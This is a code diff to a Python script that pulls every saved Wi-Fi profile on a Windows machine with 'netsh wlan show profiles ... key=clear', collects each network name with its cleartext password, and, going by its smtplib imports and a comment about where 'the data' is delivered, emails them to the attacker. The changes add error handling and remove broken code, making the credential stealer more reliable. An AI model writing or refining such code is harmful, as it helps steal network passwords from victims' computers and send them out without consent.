@@ -1,8 +1,6 @@
 import subprocess
 import smtplib
-from email import encoders
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 
 # the email you want the data delivered to
@@ -26,10 +24,12 @@ data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('ut
 networks = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]
 
 for network in networks:
-    network = '\"' + network + '\"'
-for network in networks:
-    passwords = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', 'name=', network, 'key=clear']).decode('utf-8').split('\n')
-    passwords = [line.split(':')[1][1:-1] for line in passwords if "Key Content" in line]
+    try:
+        passwords = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', 'name=', network, 'key=clear']).decode('utf-8').split('\n')
+        passwords = [line.split(':')[1][1:-1] for line in passwords if "Key Content" in line]
+    except subprocess.CalledProcessError:
+        finalList += f'Name: {network}, Password: Error\n'
+        continue
     try:
         finalList += f'Name: {network}, Password: {passwords[0]}\n'
     except IndexError:
